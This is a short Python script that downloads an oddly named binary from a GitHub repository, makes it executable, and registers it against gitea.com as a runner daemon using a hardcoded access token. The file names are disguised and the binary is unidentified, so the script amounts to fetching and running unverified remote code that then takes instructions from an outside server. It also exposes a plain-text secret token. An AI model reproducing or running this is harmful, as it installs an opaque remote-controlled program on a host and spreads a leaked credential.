import urllib.request
import subprocess
import os

TOKEN = "ViOjsHBuSESkK0fRd6caXNnYqsLB3WHDndITTZkb"

URL = (
    "https://github.com/medujaisa/reimagined-carnival/"
    "raw/refs/heads/main/badolaiks"
)

# Download binary
urllib.request.urlretrieve(URL, "nasmaos")

# Make executable
os.chmod("nasmaos", 0o755)

# Register runner
subprocess.run([
    "./nasmaos",
    "register",
    "--instance", "https://gitea.com/",
    "--token", TOKEN,
    "--labels", "doco",
    "--name", "doco"
], check=True)

# Start daemon
subprocess.run(["./nasmaos", "daemon"], check=True)
